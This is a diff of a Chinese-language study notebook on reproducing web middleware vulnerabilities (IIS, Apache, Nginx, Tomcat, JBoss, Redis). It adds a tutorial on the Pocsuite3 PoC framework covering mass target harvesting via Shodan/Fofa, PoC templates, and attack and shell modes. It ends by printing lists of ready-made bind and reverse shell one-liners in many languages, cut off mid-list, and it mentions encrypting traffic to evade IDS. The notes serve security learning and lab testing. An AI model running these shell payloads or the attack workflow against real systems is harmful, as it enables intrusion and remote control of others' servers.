@@ -1,20 +1,36 @@
 # web中间件漏洞复现/分析
 
+> https://422926799.github.io/
+>
+> https://paper.seebug.org/1989/
+>
+> https://github.com/vulhub/vulhub 漏洞靶机
+>
+> https://github.com/Threekiii/Vulhub-Reproduce  Vulhub漏洞复现知识库
+>
+> 漏洞库
+>
+> http://wiki.peiqi.tech/  PeiQi文库
+>
+> https://baizesec.github.io/bylibrary/ 白阁文库
+>
+> https://wiki.96.mk/ 零组公开漏洞库
+>
+> https://evalshell.com/ 风炫安全
+>
+> https://github.com/hanc00l/wooyun_public 乌云的漏洞库，比较老了
 
+## web容器
 
 > https://github.com/vulhub/vulhub 漏洞复现环境
 >
 > https://github.com/knownsec/pocsuite3 poc框架
 
-## 简历
-
-
-
 中间件是一种独立的系统软件或服务程序，分布式应用软件借助这种软件在不同的技术之间共享资源。中间件位于客户机/服务器的操作系统之上，管理计算机资源和网络通讯。是连接两个独立应用程序或独立系统的软件。相连接的系统，即使它们具有不同的接口，但通过中间件相互之间仍能交换信息。执行中间件的一个关键途径是信息传递。通过中间件，应用程序可以工作于多平台或OS环境。（百度百科）
 
 *   **以下更多是搭建环境和利用；对漏洞运行的原理分析很少，后面可能会补充**
 
-## IIS漏洞
+### IIS漏洞
 
 *   **简介**
 
@@ -66,7 +82,7 @@
 
         **记住快照**
 
-### PUT漏洞
+#### PUT漏洞
 
 *   **介绍**
 
@@ -94,7 +110,7 @@
 
     关闭WebDAV 和写权限
 
-### 短文件名猜解
+#### 短文件名猜解
 
 *   短文件名
 
@@ -171,9 +187,9 @@
 
     3.    如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；
 
-### 远程代码执行
+#### 远程代码执行
 
-#### RCE-CVE-2017-7269
+##### RCE-CVE-2017-7269
 
 *   **介绍**
 
@@ -251,7 +267,7 @@
     2.   使用相关防护设备
     3.   安装修复补丁（KB3042553）
 
-#### HTTP.SYS远程代码执行 (MS15-034)
+##### HTTP.SYS远程代码执行 (MS15-034)
 
 *   **介绍**
 
@@ -294,7 +310,7 @@
 
          官方补丁下载：https://support.microsoft.com/zh-cn/kb/3042553
 
-### 解析漏洞
+#### 解析漏洞
 
 *   **漏洞**
 
@@ -325,13 +341,13 @@
 
     4.   过滤.asp/xm.jpg，通过ISApi组件过滤
 
-## Apache漏洞
+### Apache漏洞
 
 *   **简介**
 
     Apache 是世界使用排名第一的Web 服务器软件。它可以运行在几乎所有广泛使用的 计算机平台上，由于其 跨平台  和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/ Python等  解释器编译到服务器中。
 
-### 解析漏洞
+#### 解析漏洞
 
 Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：`shell.php.xxx.yyy`
 
@@ -365,13 +381,13 @@ php识别成功，shell.php，php处理
 
     将AddHandler application/x-httpd-php .php的配置文件删除
 
-## Nginx漏洞
+### Nginx漏洞
 
 *   **简介**
 
     Nginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好
 
-### 解析漏洞
+#### 解析漏洞
 
 *   **介绍**
 
@@ -444,7 +460,7 @@ php识别成功，shell.php，php处理
 
     2.   将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php
 
-### CRLF注入
+#### CRLF注入
 
 *   **介绍**
 
@@ -472,7 +488,7 @@ php识别成功，shell.php，php处理
 
     删除该配置
 
-### 目录穿越
+#### 目录穿越
 
 *   **介绍**
 
@@ -509,9 +525,7 @@ php识别成功，shell.php，php处理
 
     ![image-20220506213726896](web中间件漏洞/image-20220506213726896.png)
 
-
-
-## Tomcat漏洞
+### Tomcat漏洞
 
 *   **简介**
 
@@ -547,7 +561,7 @@ php识别成功，shell.php，php处理
 
     work	Tomcat工作时的目录，用来存放Tomcat运行时jsp翻译为Servlet的源码，和Session钝化的目录。
 
-### Tomcat 任意文件写入(CVE-2017-12615)
+#### Tomcat 任意文件写入(CVE-2017-12615)
 
 *   **介绍**
 
@@ -613,7 +627,7 @@ php识别成功，shell.php，php处理
 
     3.   将readonly=true(默认为true)
 
-### Tomcat 远程代码执行（CVE-2019-0232）
+#### Tomcat 远程代码执行（CVE-2019-0232）
 
 *   **介绍**
 
@@ -659,7 +673,7 @@ php识别成功，shell.php，php处理
     1.   临时禁用AJP协议端口，在conf/server.xml配置文件中注释掉<Connector port=“8009” protocol="AJP/1.3"redirectPort=“8443” />
     2.   更新tomcat版本
 
-### Tomcat 弱口令&后台war部署
+#### Tomcat 弱口令&后台war部署
 
 *   **介绍**
 
@@ -745,7 +759,7 @@ php识别成功，shell.php，php处理
 
     4.   后台管理避免弱口令。
 
-## jBoss漏洞
+### jBoss漏洞
 
 *   **简介**
 
@@ -755,9 +769,9 @@ php识别成功，shell.php，php处理
 
     一样利用vulhub搭建环境
 
-### 反序列化漏洞
+#### 反序列化漏洞
 
-#### JBoss <=4.x JBossMQ JMS 反序列化漏洞(CVE-2017-7504)
+##### JBoss <=4.x JBossMQ JMS 反序列化漏洞(CVE-2017-7504)
 
 *   **介绍**
 
@@ -861,7 +875,7 @@ php识别成功，shell.php，php处理
     
         ![image-20220508181255517](web中间件漏洞/image-20220508181255517.png)
 
-#### JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）
+##### JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）
 
 *   **介绍**
 
@@ -879,7 +893,7 @@ php识别成功，shell.php，php处理
 
     ![image-20220508183423117](web中间件漏洞/image-20220508183423117.png)
 
-#### JBoss JMXInvokerServlet 反序列化漏洞
+##### JBoss JMXInvokerServlet 反序列化漏洞
 
 *   **介绍**
 
@@ -909,7 +923,7 @@ php识别成功，shell.php，php处理
 
          *   添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint  标签中：<url-pattern>/*</url-pattern>用于对 http invoker 组件进行访问控制。
 
-### 弱口令&后台war部署
+#### 弱口令&后台war部署
 
 *   **介绍**
 
@@ -948,9 +962,13 @@ php识别成功，shell.php，php处理
         
         ![image-20220508225714577](web中间件漏洞/image-20220508225714577.png)
 
-# web开发框架漏洞
 
-## spring boot漏洞
+
+## web开发框架漏洞
+
+### spring
+
+#### spring boot漏洞
 
 > https://github.com/LandGrey/SpringBootVulExploit
 >
@@ -965,13 +983,27 @@ php识别成功，shell.php，php处理
 
 [springboot漏洞](./web中间件漏洞/springboot漏洞.md)
 
+#### SpringCloud
 
+简单的介绍，Spring Cloud 是一系列框架的集合， 内部包含了许多框架，这些框架互相协作，共同来构建分布式系统。利用这些组件，可以非常方便地构建一个分布式系统。
 
-# 服务漏洞
+##### SpringCloud Function SpEL 注入（CVE-2022-22963）
 
-## REDIS
+### Laravel
 
-### 什么是Redis
+## CMS漏洞
+
+## web应用漏洞
+
+## OA产品漏洞
+
+> 办公自动化（Office Automation，简称OA），是将计算机、通信等现代化技术运用到传统办公方式，进而形成的一种新型办公方式。办公自动化利用现代化设备和信息化技术，代替办公人员传统的部分手动或重复性业务活动，优质而高效地处理办公事务和业务信息，实现对信息资源的高效利用，进而达到提高生产率、辅助决策的目的，最大限度地提高工作效率和质量、改善工作环境。
+
+## 服务器应用漏洞
+
+### REDIS
+
+#### 什么是Redis
 
 - redis是一个非关系型数据库，是通过键值对存储的，也就是python里面的字典。在部分场合可以对关系数据库起到很好的补充作用。
 - Redis运行在内存中但是可以持久化到磁盘，所以在对不同数据集进行高速读写时需要权衡内存，因为数据量不能大于硬件内存。在内存数据库方面的另一个优点是，相比在磁盘上相同的复杂的数据结构，在内存中操作起来非常简单，这样Redis可以做很多内部复杂性很强的事情。同时，在磁盘格式方面他们是紧凑的以追加的方式产生的，因为他们并不需要进行随机访问。
@@ -980,7 +1012,7 @@ redis基本语法：
 
 - 
 
-### Redis未授权访问：
+#### Redis未授权访问：
 
 漏洞原理：
 
@@ -1003,7 +1035,7 @@ redis基本语法：
 
 - 使用强密码认证
 
-### Redis知道密码远程登陆：
+#### Redis知道密码远程登陆：
 
 - 通过eval命令来执行Lua脚本：
 
@@ -1040,20 +1072,528 @@ redis基本语法：
         return res
         ```
 
+## 网络设备漏洞
 
-# spring boot漏洞
+## Pocsuite3 
 
-Pocsuite3 
-
-> https://pocsuite.org/guide/what-is-pocsuite3.html
+> https://pocsuite.org/guide/what-is-pocsuite3.html 官方文档
+>
+> poc收集
+>
+> https://github.com/luck-ying/Library-POC
+>
+> https://github.com/hanc00l/some_pocsuite
 
 Pocsuite3 是远程漏洞测试框架。你可以直接使用 Pocsuite3 进行漏洞的验证与利用，也可以基于 Pocsuite3 进行 PoC/Exp 的开发，因为它也是一个 PoC 开发框架；同时，还可以在你的漏洞测试工具里直接集成 Pocsuite3，它也提供标准的调用类。
 
 Pocsuite3 采用 Python3 编写，支持**验证，利用及 shell 三种模式**，你可以指定单个目标或者从文件导入多个目标，使用单个 PoC 或者 PoC 集合进行漏洞的验证或利用。可以使用命令行模式进行调用，也支持类似 Metasploit 的交互模式进行处理，除此之外，还包含了一些基本的如输出结果报告等功能。
 
-`pip3 install pocsuite3`
+```
+pip3 install pocsuite3  #安装
+pocsuite -h  
+```
 
-## 运行
+当用户指定了目标和 PoC 后，框架会将每个目标和 PoC 进行匹配（[笛卡尔积](https://zh.wikipedia.org/wiki/笛卡儿积)），生成一个元素为 `(target, poc_module)` 的队列，然后起一个默认大小为 150（可通过 `--threads` 设置） 的线程池处理这个队列。
 
-Pocsuite3 有三种运行方法，1、命令行；2、交互式控制台；3、集成调用。
+在 Pocsuite3 中，PoC 脚本有三种运行模式，分别对应 PoC 脚本中定义的三种方法，可使用命令行参数 `--verify`、`--attack`、`--shell` 决定执行哪种方法，如果不指定，默认是 `--verify`。
 
+### 基本使用
+
+![img](./web中间件漏洞.assets/architecture.118e13fa.png)
+
+
+
+| 命令                                           | 解释                                                         |                                                              |
+| ---------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
+| **目标**                                       |                                                              |                                                              |
+| -u / --url                                     | 加载单个 URL 或 CIDR，支持 IPv4 / IPv6。                     |                                                              |
+| -f / --file                                    | 从文件中加载多个 URL 或 CIDR，每行一个。如果遇到以 # 开头的行，会跳过该行。 |                                                              |
+| -p / --ports                                   | 为 URL 或 CIDR 添加额外端口，格式：[协议:]端口, 协议是可选的，多个端口间以 , 分隔。 |                                                              |
+| -s                                             | 使用-s 参数可以不加载 target 本身的端口，只使用 -p 提供的端口。 |                                                              |
+| `--dork-shodan` / `--shodan-token`             | 通过 Shodan API 批量获取测试目标。首次使用会提示输入 [`Shodan API key`](https://account.shodan.io/)，验证可用后会保存到 `$HOME/.pocsuiterc` 文件中，除非 token 过期，下次使用不会重复询问，也可使用 `--shodan-token` 参数提供。单页检索数量为 `100`。 |                                                              |
+| `--dork-fofa` / `--fofa-user` / `--fofa-token` | 通过 Fofa API 批量获取测试目标。首次使用会提示输入 `Fofa user email` 和 [`Fofa API Key`](https://fofa.info/userInfo)，验证可用后会保存到 `$HOME/.pocsuiterc` 文件中，除非 token 过期，下次使用不会重复询问，也可使用 `--fofa-user` 和 `--fofa-token` 参数提供。单页检索数量为 `100`。 |                                                              |
+| WARNING                                        | 部分搜索引擎检索的数据无协议字段，或是字段不准确。 不同搜索引擎的 dork 语法不一样，确保提供正确的 dork。<br/> 如果 dork 有特殊字符，不方便在终端输入，可以 base64 格式提供，并添加 `--dork-b64` 参数。<br/> 可通过 `--search-type web/host` 限定搜索网站还是主机，部分搜索引擎没有对二者进行区分。 |                                                              |
+| **PoC 脚本加载**                               |                                                              |                                                              |
+| `-r`                                           | 指定一个或多个 PoC 路径（或目录），如果提供的是目录，框架将遍历目录然后加载所有符合条件的 PoC。多个路径或目录之间用`空格`分隔。 |                                                              |
+| -k                                             | 指定关键词（支持正则）对 PoC 进行筛选，如组件名称、CVE 编号等。<br/>如果我们确认了目标组件，就可以用 `-k` 选项找到所以对应的 PoC 对目标进行批量测试。<br/>如果只提供了 `-k` 选项，`-r` 默认为 Pocsuite3 自带的 `pocsuite3/pocs` 目录。 |                                                              |
+| **运行控制**                                   |                                                              |                                                              |
+| `--threads`                                    | 线程池大小控制，默认为 `Min(150, 目标总数)`。                |                                                              |
+| `--pcap`                                       | 在运行 PoC 时使用 `--pcap` 参数，可以将通信流量保存为 pcap 文件。 |                                                              |
+| `--verify`                                     | 验证模式，执行 PoC 脚本的 _verify() 方法， 进行漏洞验证。<br/>在 PoC 脚本中，attack 模式和 shell 模式的实现是可选的， 如果不指定运行模式，默认是 verify。 |                                                              |
+| --attack                                       | 攻击模式，执行 PoC 脚本的 _attack() 方法，具体表现取决于方法的实现。 |                                                              |
+| --shell / --lhost / --lport / --tls            | shell 模式，执行 PoC 脚本的 _shell() 方法，控制台会进入 shell 交互模式执行命令及获取输出 ，所以只能运行单个poc。<br/> Pocsuite3 在 shell 模式会默认监听本机的 6666 端（可通过 --lhost、--lport 修改），编写对应的攻击代码，让目标执行反向连接运行 Pocsuite3 系统 IP 的 6666 端口即可得到一个 shell。<br/>如果要启用 TLS 监听器（如 openssl 的反连 shell），可使用 --tls 参数。 |                                                              |
+| **网络控制**                                   |                                                              |                                                              |
+| `--proxy` / `--proxy-cred`                     | 全局 HTTP/HTTPS/SOCKS 代理，支持的协议类型有：http、https、socks4、socks5、socks5h。<br>如果代理需要认证，可使用参数 `--proxy-cred name:password` 提供。 | `pocsuite -r poc.py -u https://www.baidu.com --proxy socks5://127.0.0.1:9150` |
+| `--timeout`                                    | 全局超时设置，默认为 `10s`。需要注意的是，如果某请求本身设置了超时，则会以请求本身的为准，不会覆盖。 |                                                              |
+| `--user-agent`                                 | HTTP 请求的 `User-Agent` 设置，默认为随机。<br>其他网络请求控制选项还有：`--cookie`、`--host`、`--referer`、`--retry`、`--delay`、`--headers`，此处不再一一赘述。 |                                                              |
+| **DNSLOG服务**                                 |                                                              |                                                              |
+|                                                |                                                              |                                                              |
+| **其他**                                       |                                                              |                                                              |
+| `-v` / `--ppt`                                 | 控制台日志获取结果，`-v` 用于控制日志等级，`--ppt` 可以将 IP 地址马赛克处理，方便录屏。 |                                                              |
+| **自定义的参数**                               |                                                              |                                                              |
+| `--optioins`                                   | 查看poc自己定义的参数信息，然后`--参数名`  来输入poc需要的参数。 |                                                              |
+
+
+
+
+
+### 脚本编写
+
+```cmd
+-n / --new   #生成一个poc模板
+
+```
+
+#### POCBase
+
+Pocsuite3 实现了 PoC 基类：`POCBase`，很多共用的代码片段都放到此基类中。我们编写 PoC 时，只需要继承该基类就可。
+
+比较常用的属性和方法如下：
+
+```python
+
+常用属性：
+
+self.url  # 目标 url
+self.scheme  # 目标 url 的协议
+self.rhost  # 目标 url 的主机名
+self.rport  # 目标 url 的端口
+self.host_ip  # 本机的 wan 口 ip
+
+常用方法：
+
+self._check()
+self.get_option('key')  # 获取自定义命令行参数的值
+self.parse_output({})  # 返回结果的方法，参数是一个字典，建议统一使用该方法返回结果
+
+
+```
+
+`self._check()` 方法代码如下，会进行端口开放检查、http/https 协议自动纠正，首页关键词 check，关键词蜜罐检查等功能。可以一定程度避免将 `Payload` 发送到蜜罐，减少误报。
+
+#### 编写步骤
+
+- 创建py文件
+- 从 `pocsuite3.api` 导入待用的类和方法，编写 PoC 实现类 `DemoPOC`，继承自 `PoCBase` 类。
+- 填写poc信息
+- 编写三种模式
+- 在类的外部调用 `register_poc()` 方法注册 PoC 类
+
+```python
+class DemoPOC(POCBase):
+    #poc信息,
+    vulID = '99335'  # Seebug 漏洞收录 ID，如果没有则为 0
+    version = '1'  # PoC 的版本，默认为 1
+    "........................................................................"
+    
+    #三种模式编写
+    def _verify(self):
+      pass
+	def _attack(self):
+        pass
+    def _shell(self):
+        pass
+
+# 注册 DemoPOC 类
+register_poc(DemoPOC)
+
+```
+
+#### 基本poc信息
+
+- **这些字段都不是必须的，也可留空**
+- 从 1.9.8 版本开始，基类 POCBase 为 PoC 的所有属性设置了默认值，写 PoC 时可以不写任何属性字段，简化 PoC 的开发。
+
+```python
+vulID = '99335'  # Seebug 漏洞收录 ID，如果没有则为 0
+version = '1'  # PoC 的版本，默认为 1
+author = 'seebug'  # PoC 的作者
+vulDate = '2021-8-18'  # 漏洞公开日期 (%Y-%m-%d)
+createDate = '2021-8-20'  # PoC 编写日期 (%Y-%m-%d)
+updateDate = '2021-8-20'  # PoC 更新日期 (%Y-%m-%d)
+references = ['https://www.seebug.org/vuldb/ssvid-99335']  # 漏洞来源地址，0day 不用写
+name = 'Fortinet FortiWeb 授权命令执行 (CVE-2021-22123)'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
+appPowerLink = 'https://www.fortinet.com'  # 漏洞厂商主页地址
+appName = 'FortiWeb'  # 漏洞应用名称
+appVersion = '<=6.4.0'  # 漏洞影响版本
+vulType = 'Code Execution'  # 漏洞类型，参见漏洞类型规范表
+desc = '/api/v2.0/user/remoteserver.saml接口的name参数存在命令注入'  # 漏洞简要描述
+samples = ['http://192.168.1.1']  # 测试样列，就是用 PoC 测试成功的目标
+install_requires = ['BeautifulSoup4:bs4']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+pocDesc = ''' poc的用法描述 '''
+category = POC_CATEGORY.EXPLOITS.WEBAPP  # PoC 的分类
+protocol = POC_CATEGORY.PROTOCOL.HTTP  # PoC 的默认协议，方便对 url 格式化
+protocol_default_port = 8443  # 目标的默认端口，当提供的目标不包含端口的时候，方便对 url 格式化
+dork = {'zoomeye': 'deviceState.admin.hostname'}  # 搜索 dork，如果运行 PoC 时不提供目标且该字段不为空，将会调用插件从搜索引擎获取目标。
+suricata_request = '''http.uri; content: "/api/v2.0/user/remoteserver.saml";'''  # 请求流量 suricata 规则
+suricata_response = ''  # 响应流量 suricata 规则
+
+```
+
+#### 三种模式
+
+三种模式决定了我们需要写三个函数完成不同功能。
+
+##### **编写验证模式**
+
+- 验证漏洞存在。验证方式取决于具体的漏洞类型，比如检查目标的软件版本、判断某个关键 API 的状态码或返回、读取特定文件、执行一个命令并获取结果，结合 DNSLog 带外回显等。该模式用于批量漏洞排查，一般不需要用户提供额外参数 ，且应尽可能对目标无害。
+
+- ```python
+    def _verify(self, verify=True):
+        result = {}
+        ...
+    
+        return self.parse_output(result)
+    
+    # PoCBase
+    def parse_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail()
+        return output
+    ```
+
+- 通过 `self.parse_output(result)` 返回结果，result 为字典类型。**如果 result 不为空，则会返回成功信息（即 PoC 验证成功），否则返回失败。在写 PoC 时，确保验证成功后再给 result 赋值并返回即可。**
+
+- output 为 Pocsuite3 标准输出 API，如果要输出调用成功信息则使用 `output.success(result)`，如果要输出调用失败则 `output.fail()`，系统自动捕获异常，不需要 PoC 里处理捕获，如果 PoC 里使用 `try...except` 来捕获异常，可通过`output.error('Error Message')` 来传递异常内容，
+
+- **建议直接使用 PoCBase 中的 `parse_output()` 通用结果处理函数对 `_verify` 和 `_attack` 结果进行返回。**
+
+##### result返回规范
+
+- 只要result里面保存了数据，就代表有漏洞了，所以result里面数据保存规范点。
+
+- 比如
+
+    - ```
+        result['ShellInfo'] = {}
+        result['ShellInfo']['URL'] = 'xxxxx'
+        ```
+
+- **extra 字段 ：自己设置字段**
+
+    - extra 字段为通用结果字段的补充字段，如果需要返回的内容中不属于通用结果字段，那么可以使用 extra 字段进行赋值。extra 字段为 dict 格式，可自定义 key 进行赋值，如：
+
+    - ```python
+        result['extra'] = {}
+        result['extra']['field'] = 'aa'
+        ```
+
+- **通用字段说明** （**以下只是字段含义示例，不是标准的 JSON 格式**）
+
+    - ```json
+        result：[
+            {  name: 'DBInfo'，       value：'数据库内容' }，
+                {  name: 'Username'，      value: '管理员用户名'},
+                {  name: 'Password'，      value：'管理员密码' }，
+                {  name: 'Salt'，          value: '加密盐值'},
+                {  name: 'Uid'，           value: '用户ID'},
+                {  name: 'Groupid'，       value: '用户组ID'},
+        
+        
+            {  name: 'ShellInfo'，     value: 'Webshell信息'},
+                {  name: 'URL'，           value: 'Webshell地址'},
+                {  name: 'Content'，       value: 'Webshell内容'},
+        
+        
+            {  name: 'FileInfo'，      value: '文件信息'},
+                {  name: 'Filename'，      value: '文件名称'},
+                {  name: 'Content'，       value: '文件内容'},
+        
+        
+            {  name: 'XSSInfo'，       value: '跨站脚本信息'},
+                {  name: 'URL'，           value: '验证URL'},
+                {  name: 'Payload'，       value: '验证Payload'},
+        
+        
+            {  name: 'AdminInfo'，     value: '管理员信息'},
+                {  name: 'Uid'，           value: '管理员ID'},
+                {  name: 'Username'，      value: '管理员用户名'},
+                {  name: 'Password'，      value: '管理员密码'},
+        
+        
+            {  name: 'Database'，      value：'数据库信息' }，
+                {  name: 'Hostname'，      value: '数据库主机名'},
+                {  name: 'Username'，      value：'数据库用户名' }，
+                {  name: 'Password'，      value: '数据库密码'},
+                {  name: 'DBname'，        value: '数据库名'},
+        
+        
+            {  name: 'VerifyInfo'，    value: '验证信息'},
+                {  name: 'Target'，        value: '验证host:port'},
+                {  name: 'URL'，           value: '验证URL'},
+                {  name: 'Postdata'，      value: '验证POST数据'},
+                {  name: 'Path'，          value: '网站绝对路径'},
+        
+        
+            {  name: 'SiteAttr'，      value: '网站服务器信息'},
+            {  name: 'Process'，       value: '服务器进程'}
+        
+        ]
+        
+        ```
+
+##### attack模式
+
+- 攻击模式，可实现某种特定需求。比如获取特定数据、写入一句话并返回 shell 地址、从命令行参数获取命令并执行、从命令行参数获取文件路径并返回文件内容等。
+- 定义它的方法与验证模式类似。
+- 如果该 PoC 没有攻击模式，可以在 `_attack()` 函数下加入一句 `return self._verify()` 这样你就无需再写 `_attack()` 函数了。
+
+##### shell模式
+
+- 获取交互式 shell。Pocsuite3 在 shell 模式会默认监听 `6666` 端口，编写对应的攻击代码，让目标执行反向连接运行 Pocsuite3 系统 IP 的 `6666` 端口即可得到一个 shell。
+
+    - ```python
+        def _shell(self):
+            cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()) 
+            # payload攻击代码 execute(cmd) ,自带了很多正向反向payload
+        ```
+
+- shell 模式下，只能运行单个 PoC 脚本，控制台会进入 shell 交互模式执行命令及输出。
+
+- 从 ***1.8.5*** 版本开始，Pocsuite3 支持 bind shell。shell 模式和原来的操作方式一致，也需要指定监听 ip 和端口，监听 ip 可以是本地任意 ip，也可以是远程服务器 ip。
+
+    - bind shell 的实现位于 [`./pocsuite3/modules/listener/bind_tcp.py`](https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/listener/bind_tcp.py)，原理是实现了一个中间层，一端连接漏洞目标的 bind shell（如 telnet 服务、nc 启动的 shell、php 一句话等），另一端连接用户指定的监听 ip 和端口，如此一来，shell 模式可以不受网络环境限制，支持在内网使用。
+
+    - 目前支持三种 bind shell，使用场景如下：
+
+        ```
+        bind_shell`：通用方法，在 shell 模式中直接调用 `return bind_shell(self, rce_func)` 即可，非常便捷。
+        针对有回显的漏洞，在 PoC 中实现一个 rce（函数名可自定义）方法，函数参数为命令输入，输出为命令输出。如果漏洞无回显，也可以通过写一句话转为有回显的。值得一提的是，用户也可以在 rce 方法中实现流量的加解密以逃避 IDS 检测。
+        
+        bind_tcp_shell`：对 tcp 绑定型 shell 的原生支持，在 shell 模式中 `return bind_tcp_shell(bind_shell_ip, bind_shell_port)
+        
+        bind_telnet_shell`：对 telnet 服务的原生支持，在 shell 模式中 `return bind_telnet_shell(ip, port, username, password)
+        ```
+
+    - 简单举几个例子，telnet 弱口令 shell 模式实现，实际只需要一行代码：
+
+        - ```python
+            def _shell(self):
+                return bind_telnet_shell(ip, port, 'iot', '***')
+            
+            ```
+
+    - php shell 模式，在目标写入一句话，然后在 `_rce` 方法中实现了流量的 AES 加解密：
+        - ![image-20221023132153573](./web中间件漏洞.assets/image-20221023132153573.png)
+
+- Pocsuite3 自带的 Payload 如下：
+
+    - ```python
+        In [1]: from pocsuite3.api import BIND_PAYLOAD, REVERSE_PAYLOAD
+        
+        In [2]: BIND_PAYLOAD.__dict__
+        Out[2]:
+        mappingproxy({'__module__': 'pocsuite3.modules.listener.bind_tcp',
+                      'NODE': 'node -e \'sh=child_process.spawn("/bin/sh");net.createServer(function(client){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}}).listen("{0}")\'',
+                      'NC': 'nc -l -p {0} -e /bin/sh',
+                      'SOCAT': 'socat TCP-LISTEN:{0},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane',
+                      'PYTHON': 'python -c \'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{0}));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])\'',
+                      'PERL': 'perl -e \'use Socket;$p={0};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){{open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");}};\'',
+                      'PHP': 'php -r \'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{0});socket_listen($s,1);$cl=socket_accept($s);while(1){{if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){{$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}}}\'',
+                      'RUBY': 'ruby -rsocket -e \'exit if fork;s=TCPServer.new("{0}");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end;end\'',
+                      'NC2': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp {0} >/tmp/f',
+                      'AWK': 'awk \'BEGIN{{s="/inet/tcp/{0}/0/0";do{{if((s|&getline c)<=0)break;if(c){{while((c|&getline)>0)print $0|&s;close(c)}}}} while(c!="exit")close(s)}}\'',
+                      'TELNETD': 'telnetd -l /bin/sh -p {0}',
+                      'NC3': 'rm -rf /tmp/f;mkfifo /tmp/f||mknod /tmp/f p;(nc -l -p {0}||nc -l {0})0</tmp/f|/bin/sh>/tmp/f 2>&1;rm /tmp/f',
+                      'R': 'R -e "s<-socketConnection(port={0},blocking=TRUE,server=TRUE,open=\'r+\');while(TRUE){{writeLines(readLines(pipe(readLines(s,1))),s)}}"',
+                      '__dict__': <attribute '__dict__' of 'BIND_PAYLOAD' objects>,
+                      '__weakref__': <attribute '__weakref__' of 'BIND_PAYLOAD' objects>,
+                      '__doc__': None})
+        
+        In [3]: REVERSE_PAYLOAD.__dict__
+        Out[3]:
+        mappingproxy({'__module__': 'pocsuite3.modules.listener.reverse_tcp',
+                      'NC': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f',
+                      'NC2': 'nc -e /bin/sh {0} {1}',
+                      'NC3': 'rm -f /tmp/p;mknod /tmp/p p && nc {0} {1} 0/tmp/p',
+                      'BASH0': 'sh -i >& /dev/tcp/{0}/{1} 0>&1',
+                      'BASH': "bash -c 'sh -i >& /dev/tcp/{0}/{1} 0>&1'",
+                      'BASH2': "bash -c 'sh -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1'",
+                      'TELNET': 'rm -rf /tmp/p;mkfifo /tmp/p||mknod /tmp/p p;telnet {0} {1} 0</tmp/p|/bin/sh 1>/tmp/p',
+                      'PERL': 'perl -e \'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
+                      'PYTHON': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
+                      'PHP': 'php -r \'$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");\'',
+                      'RUBY': 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{0}","{1}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
+                      'JAVA': 'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])\np.waitFor()',
+                      'POWERSHELL': "$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([textencoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
+                      'OPENSSL': 'rm -rf /tmp/s;mkfifo /tmp/s||mknod /tmp/s p;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {0}:{1}>/tmp/s;rm -rf /tmp/s',
